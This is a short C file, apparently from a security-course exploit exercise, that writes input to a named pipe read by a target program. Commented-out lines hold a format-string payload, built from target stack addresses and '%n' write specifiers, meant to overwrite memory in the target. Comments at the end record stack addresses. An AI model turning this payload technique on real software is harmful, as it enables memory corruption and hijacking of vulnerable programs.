#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util.h"

#define PIPEPATH "/tmp/targetpipe"

int main(void)
{
  //char bufr[136];
  //memcpy(bufr, "AAAdumm\xd8\x57\xbf\xbfzzzz\xd9\x57\xbf\xbfzzzz\xda\x57\xbf\xbfzzzz\xdb\x57\xbf\xbf", 35);

  //strcpy(bufr+35, "%08x%165u%n%253u%n%135u%n%20u%n");

  writecmd(PIPEPATH, "AAAA");
  
  return 0;
}
// esp: 0xbfbf57d8
// buf: 0xbfbf57e5